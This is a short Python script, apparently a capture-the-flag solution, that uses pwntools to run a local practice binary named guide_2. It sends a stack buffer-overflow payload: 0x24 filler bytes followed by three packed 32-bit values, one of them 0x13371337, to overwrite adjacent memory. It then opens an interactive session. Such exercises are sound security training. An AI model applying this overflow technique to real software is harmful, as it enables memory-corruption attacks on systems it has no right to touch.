from pwn import *

io = process('../chall/guide_2')

io.recvuntil(b'>')

payload = b'a' * 0x24
payload += p32(1633771873)
payload += p32(1633771890)
payload += p32(0x13371337)

io.sendline(payload)

io.interactive()